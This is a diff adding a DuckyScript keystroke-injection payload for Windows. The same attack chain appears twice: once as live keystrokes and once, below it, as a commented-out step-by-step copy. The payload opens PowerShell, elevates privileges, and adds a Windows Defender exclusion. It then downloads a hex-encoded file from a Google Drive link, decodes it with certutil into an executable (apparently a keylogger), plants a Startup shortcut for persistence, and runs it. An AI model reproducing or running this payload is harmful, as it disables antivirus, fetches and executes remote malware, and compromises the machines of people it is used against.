@@ -1,0 +1,59 @@
+
+REM Requirements:
+REM     - Nothing
+
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 2000
+STRING mkdir "$env:windir\Temp\Cache";Start-Process powershell -Verb RunAs -ArgumentList "Add-MpPreference -ExclusionPath 'C:\Windows\temp\Cache'";(new-object System.Net.WebClient).DownloadFile("https://drive.usercontent.google.com/u/0/uc?id=15dfqg3KZ7pQ_mlg1ttTo8Nh25q1AFKSd&export=download", "$env:windir\Temp\Cache\key.hex");certutil -f -decodeHex "$env:windir\temp\Cache\key.hex" "$env:windir\Temp\Cache\key.exe";$s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\key.exe";$s.Save();"$env:windir\Temp\Cache\key.exe" | clip
+ENTER
+DELAY 2000
+Left
+DELAY 1000
+ENTER
+DELAY 20000
+GUI r
+DELAY 1000
+CTRL v
+ENTER
+
+REM GUI r
+REM DELAY 1000
+REM STRING powershell
+REM DELAY 1000
+REM ENTER
+REM DELAY 2000
+REM STRING mkdir "$env:windir\Temp\Cache"
+REM DELAY 1000
+REM ENTER
+REM DELAY 2000
+REM STRING Start-Process powershell -Verb RunAs -ArgumentList "Add-MpPreference -ExclusionPath 'C:\Windows\temp\Cache'"
+REM DELAY 1000
+REM ENTER
+REM DELAY 1000
+REM Left
+REM DELAY 1000
+REM ENTER 
+REM DELAY 5000
+REM STRING (new-object System.Net.WebClient).DownloadFile("https://drive.usercontent.google.com/u/0/uc?id=15dfqg3KZ7pQ_mlg1ttTo8Nh25q1AFKSd&export=download", "$env:windir\Temp\Cache\key.hex")
+REM DELAY 1000
+REM ENTER
+REM DELAY 20000
+REM STRING certutil -f -decodeHex "$env:windir\temp\Cache\key.hex" "$env:windir\Temp\Cache\key.exe"
+REM DELAY 1000
+REM ENTER
+REM STRING $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\key.exe";$s.Save()
+REM DELAY 1000
+REM ENTER
+REM DELAY 1000
+REM STRING "$env:windir\Temp\Cache\key.exe" | clip
+REM DELAY 1000
+REM ENTER
+REM DELAY 1000
+REM GUI r
+REM DELAY 1000
+REM CTRL v
+REM ENTER
